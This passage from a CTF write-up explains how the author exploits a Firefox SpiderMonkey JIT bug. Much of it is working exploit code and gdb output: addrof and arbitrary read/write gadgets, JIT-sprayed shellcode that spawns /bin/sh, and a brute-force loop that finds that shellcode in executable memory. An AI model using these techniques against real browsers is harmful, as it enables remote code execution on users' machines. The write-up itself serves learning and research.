</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="cm">/* Initializing helper method for casting purposes */</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Converter taken from https://org.anize.rs/corCTF-2021/pwn/outfoxed
</span></span></span><span class="line"><span class="cl"><span class="c1">// This will help us to convert between BigInt and Double easily
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">converter</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">u64view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">converter</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">f64view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">converter</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Bit-cast an uint64_t to a float64
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u64view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64view</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Bit-cast a float64 to an uint64_t
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">d2i</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">f64view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">u64view</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Add double with BigInt. Return Double
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">doubleAddBigInt</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">d2i</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="o">+</span> <span class="nx">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s start describing on how we will use the above overlapping object to create our read gadget. Below is the code that I use to create a method to read an object address. Below is the code</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="cm">/* Building function to perform read &amp; write */</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Some ideas are taken from https://webcache.googleusercontent.com/search?q=cache:ySfo3rNPA2kJ:https://labs.f-secure.com/blog/exploiting-cve-2019-17026-a-firefox-jit-bug/
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="p">.</span><span class="nx">y</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="p">.</span><span class="nx">z</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Return given object address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// The purpose of this logic is given an object, we want to get the address of it. Logic:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - First, we will store the original pointer of the object d properties
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Then, we will set the given object to d.y
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Instead of reading the stored value inside d.y, what we want to read is only the 6-LSB (bytes, not bits)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//   So, the trick is we will try to read d.x+6 (shift the current object d properties pointer by 6)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Now, the new d.x 8-bytes will consist of |d.y+5|d.y+4|d.y+3|d.y+2|d.y+1|d.y|d.x+8|d.x+7|
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - After that, convert it to BigInt, and then shift it by 2-bytes, so that we get the true address without tag.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Revert the pointer and return the Double representation of the object address.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">original</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nx">d</span><span class="p">.</span><span class="nx">y</span> <span class="o">=</span> <span class="nx">o</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="nx">doubleAddBigInt</span><span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">],</span> <span class="mh">0x6</span><span class="nx">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">result</span> <span class="o">=</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">d2i</span><span class="p">(</span><span class="nx">d</span><span class="p">.</span><span class="nx">x</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="nx">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="nx">original</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">result</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To explain it, remember that when we inspect the gdb, <code>b[27]</code> is actually the <code>d</code> stored pointer of properties. So, what this code aim to do:</p>
<ul>
<li>Assign 0 to <code>d.x</code>, <code>d.y</code>, and <code>d.z</code>. Now, our heap layout for <code>d</code> properties will be like this</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gefâž¤  x/4gx 0x00001f4107200da0
</span></span><span class="line"><span class="cl">0x1f4107200da0: 0xfff8800000000000      0xfff8800000000000
</span></span><span class="line"><span class="cl">0x1f4107200db0: 0xfff8800000000000      0x00007ffff6951ff2
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Assign the object to <code>d.y</code> (Just test by assigning any object). Now, our heap layout for <code>d</code> properties will be like this</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gefâž¤  x/4gx 0x00001f4107200da0
</span></span><span class="line"><span class="cl">0x1f4107200da0: 0xfff8800000000000      0xfffe1f4107200f00
</span></span><span class="line"><span class="cl">0x1f4107200db0: 0xfff8800000000000      0x00007ffff6951ff2
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>What we want to retrieve on <code>d.y</code> is only the 6 bytes of its LSB, because that is the address of the object. However, we can&rsquo;t really get it by directly access the <code>d.y</code> value because of the object tag. So, we need to get rid of it</li>
<li>The trick is to shift the current <code>d</code> properties pointer by 6 (So instead of <code>0x00001f4107200da0</code>, overwrite it to <code>0x00001f4107200da0+6</code>). Now, if we get <code>d.x</code> value, the result will be like <code>0x1f4107200f00fff8</code></li>
<li>Now, accessing <code>d.x</code> will return what the stored value inside address in form of Double due to successfully remove the object tag.</li>
<li>To get the real address, convert the retrieved <code>d.x</code> to BigInt first, right shift it by 16 (so that now the retrieved value will be <code>0x1f4107200f00</code>), and then convert it back to Double.</li>
<li>Now, we finally get rid of the tag and get the passed object address in form of Double.</li>
</ul>
<p>Now, let&rsquo;s try to create a write gadget. Below is the code</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// Write value (double) to the given address (double)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">write</span><span class="p">(</span><span class="nx">dbl_addr</span><span class="p">,</span> <span class="nx">dbl_val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// General logic:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Overwrite the object d properties pointter to the given address.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Now, d.x will point to the given address.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Assign d.x value, which mean now the given address contains our given value.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">original</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="nx">dbl_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">d</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="nx">dbl_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="nx">original</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The comment of the code is already self-explanatory. Basically we overwrite the <code>d</code> properties pointer with our target address, assign <code>d.x</code> with the targeted value, and after that, our targeted address will be overwritten.</p>
<p>Now, let&rsquo;s try to create another read gadget. But this one will be used to read an address value in form of Double (not to read an address of object, so it slightly different).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">target_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">target_buf</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mf">2.4303</span><span class="nx">e</span><span class="o">-</span><span class="mi">320</span><span class="p">)</span> <span class="c1">// Just to set the array element count
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">data_ptr</span> <span class="o">=</span> <span class="nx">doubleAddBigInt</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">target_buf</span><span class="p">),</span> <span class="mh">0x30</span><span class="nx">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Given an address in Double form, read &amp; return the address stored value as double
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">read</span><span class="p">(</span><span class="nx">dbl_addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">write</span><span class="p">(</span><span class="nx">data_ptr</span><span class="p">,</span> <span class="nx">dbl_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">target_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>What we do here is:</p>
<ul>
<li>Create another array</li>
<li>Overwrite the metadata pointer of its element to our targeted address</li>
<li>Now, accessing d[0] will return the targeted address value. Notes that there is some limitation with this, where if the address MSBs is a tag object, we won&rsquo;t be able to read it.</li>
</ul>
<p>I do this after trial-and-error and reading some writeups. During testing, this is the most stable method to read for my payload.</p>
<p>Finally, we already create three gadgets:</p>
<ul>
<li>Read the address of an object</li>
<li>Write any value to any address</li>
<li>Read any address stored value (with some limitation)</li>
</ul>
<p>Now, we will move to our next phase, where we aim to gain RCE.</p>
<h4 id="smuggle-shellcode">Smuggle shellcode</h4>
<p>Let&rsquo;s do JIT Spraying attack now. In order to do this, first we need to craft our shellcode, where its line should be less than 8 bytes. Taken from this <a href="https://ctftime.org/writeup/29915" target="_blank" rel="noopener noreffer ">writeup</a>, this shellcode will spawn a shell if got executed</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Shellcode taken from https://ctftime.org/writeup/29915
</span></span><span class="line"><span class="cl">instructions = [
</span></span><span class="line"><span class="cl">&#34;mov ebx, 0x0068732f&#34;,
</span></span><span class="line"><span class="cl">&#34;shl rbx, 32&#34;,
</span></span><span class="line"><span class="cl">&#34;mov edx, 0x6e69622f&#34;,
</span></span><span class="line"><span class="cl">&#34;add rbx, rdx&#34;,
</span></span><span class="line"><span class="cl">&#34;push rbx&#34;,
</span></span><span class="line"><span class="cl">&#34;xor eax, eax&#34;,
</span></span><span class="line"><span class="cl">&#34;mov al, 0x3b&#34;,
</span></span><span class="line"><span class="cl">&#34;mov rdi, rsp&#34;,
</span></span><span class="line"><span class="cl">&#34;xor edx, edx&#34;,
</span></span><span class="line"><span class="cl">&#34;syscall&#34;
</span></span><span class="line"><span class="cl">]
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we have our shellcode, let&rsquo;s smuggle this by:</p>
<ul>
<li>Pad each line so that its size will be 8-bytes</li>
<li>Convert the hex bytes to Double (I use python)
<ul>
<li>For example, this shellcode bytes <code>b'\xbb/sh\x00\x90\x90\x90'</code> double representation is <code>-6.827620262216015e-229</code></li>
</ul>
</li>
<li>Now, create a method that consist of this constants. Below is my crafter function.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="cm">/* JIT Spray */</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Some ideas are taken from https://ret2.life/posts/corCTF-2021/#fn:2
</span></span></span><span class="line"><span class="cl"><span class="c1">// Shellcode are inspired from https://ctftime.org/writeup/29915
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// This will be JITed later. These const will be stored in a r-x region after being JITed.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">sc</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">sc_marker</span> <span class="o">=</span> <span class="mf">5.40900888</span><span class="nx">e</span><span class="o">-</span><span class="mi">315</span><span class="p">;</span>      <span class="c1">// 0x41414141 in memory. Will be used during searching for the address of our const.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">SC1</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.827620262216015</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC2</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.82852429045179</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC3</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.82831220543336</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC4</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527040799766</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC5</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527034422697</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC6</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527034440643</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC7</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527034390964</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC8</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527042770368</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC9</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527034447392</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC10</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527034370483</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If you notice, I smuggle 0x41414141 also into the method. This will be useful later during searching for our JIT-ed function address.</p>
<p>Now that the function is ready, let&rsquo;s force this function to be JIT-ed by IonMonkey. How? Simply run this method so many times like below</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// Execute sc 0x1000 to make it got JITed
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">sc</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, we can move to our next step after it got jitted.</p>
<h4 id="find-the-jit-ed-function-and-jump-to-it">Find the JIT-ed function and jump to it</h4>
<p>In order to do this, we will need to inspect the <code>sc</code> function metadata. Let&rsquo;s try to get the function address with our <code>addrof</code> method.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// Get the function address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">sc_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">sc</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After running that line, we will know get the address of function <code>sc</code>. Now, let&rsquo;s inspect it in gdb.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gefâž¤  vmmap
</span></span><span class="line"><span class="cl">[ Legend:  Code | Heap | Stack ]
</span></span><span class="line"><span class="cl">Start              End                Offset             Perm Path
</span></span><span class="line"><span class="cl">0x001f4107200000 0x001f4107300000 0x00000000000000 rw-
</span></span><span class="line"><span class="cl">0x00291cb41b4000 0x00291cb41c4000 0x00000000000000 ---
</span></span><span class="line"><span class="cl">0x00291cb41c4000 0x00291cb41e1000 0x00000000000000 r-x
</span></span><span class="line"><span class="cl">0x00291cb41e1000 0x00291cb41e4000 0x00000000000000 r-x
</span></span><span class="line"><span class="cl">0x00291cb41e4000 0x00291cb41f4000 0x00000000000000 ---
</span></span><span class="line"><span class="cl">0x00291cb41f4000 0x00291cb41f7000 0x00000000000000 r-x
</span></span><span class="line"><span class="cl">0x00291cb41f7000 0x00291cb4204000 0x00000000000000 r-x
</span></span><span class="line"><span class="cl">gefâž¤  tele 0x1f41072026c8
</span></span><span class="line"><span class="cl">0x001f41072026c8â”‚+0x0000: 0x003afd8a73c160  â†’  0x003afd8a73b0a0  â†’  0x005555585c0700  â†’  0x00555558657190  â†’  &#34;Function&#34;
</span></span><span class="line"><span class="cl">0x001f41072026d0â”‚+0x0008: 0x0055555700b9a8  â†’  &lt;emptyObjectSlotsHeaders+8&gt; add BYTE PTR [rax], al
</span></span><span class="line"><span class="cl">0x001f41072026d8â”‚+0x0010: 0x0055555700b970  â†’  &lt;emptyElementsHeader+16&gt; add BYTE PTR [rax], al
</span></span><span class="line"><span class="cl">0x001f41072026e0â”‚+0x0018: 0xfff88000000000a0
</span></span><span class="line"><span class="cl">0x001f41072026e8â”‚+0x0020: 0xfffe3afd8a73e038
</span></span><span class="line"><span class="cl">0x001f41072026f0â”‚+0x0028: 0x003afd8a76bf10  â†’  0x00291cb41d4d50  â†’  0x7ffff6924500b848
</span></span><span class="line"><span class="cl">0x001f41072026f8â”‚+0x0030: 0xfffb3afd8a7145c0
</span></span><span class="line"><span class="cl">0x001f4107202700â”‚+0x0038: 0x007ffff6951ff1  â†’  0x0100007ffff69518
</span></span><span class="line"><span class="cl">0x001f4107202708â”‚+0x0040: 0x0000000100000000
</span></span><span class="line"><span class="cl">0x001f4107202710â”‚+0x0048: 0x001f4107200da0  â†’  0xfff8800000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Inspecting inside the gdb, we notice that at offset <code>0x28</code>, if we follow the stored pointer, it will point to the JIT-ed area (the area where the permission is <code>r-x</code>). <code>0x00291cb41d4d50</code> is in <code>r-x</code> area.</p>
<p>Now, we need to know where is our shellcode stored. How to do this? Well we need to bruteforce a little bit. Based on the address that we got before, let&rsquo;s try to increase the address, and then we check the stored value. Here comes why we need to smuggle <code>0x0041414141</code> in our JIT-ed function. We will use this as an identifier during bruteforce. If the stored value in our increased address is equals to <code>5.40900888e-315</code> (Double representation of <code>0x0041414141</code>), that means we have found our shellcode. Below is the implementation of the bruteforce code.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// Brute force per byte until we found our magic string (0x41414141)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">200</span><span class="nx">n</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">132777</span><span class="nx">n</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">sc_start</span> <span class="o">=</span> <span class="nx">doubleAddBigInt</span><span class="p">(</span><span class="nx">code_addr</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">check</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nx">sc_start</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">check</span> <span class="o">==</span> <span class="mf">5.40900888</span><span class="nx">e</span><span class="o">-</span><span class="mi">315</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">print</span><span class="p">(</span><span class="nx">sc_start</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we found it, somehow the JIT-ed result of the function in my local and in the server is pretty different. In my local, the const is separated by some offset, which mean we need to modify our shellcode to be able to jump to the next const, so that our payload is limited 6-bytes per line, because the last 2 bytes will be used to jump to the next const offset.</p>
<p>But in the server, all the const are adjacent to each other, so we don&rsquo;t need to do jump at all. So, for the remote payload, the smuggled shellcode is started from <code>sc_start+8</code>. Below is the proof</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">js&gt; read(sc_start)
</span></span><span class="line"><span class="cl">read(sc_start)
</span></span><span class="line"><span class="cl">5.40900888e-315
</span></span><span class="line"><span class="cl">js&gt; read(doubleAddBigInt(sc_start, 0x8n))
</span></span><span class="line"><span class="cl">read(doubleAddBigInt(sc_start, 0x8n))
</span></span><span class="line"><span class="cl">-6.827620262216015e-229
</span></span><span class="line"><span class="cl">js&gt; read(doubleAddBigInt(sc_start, 0x10n))
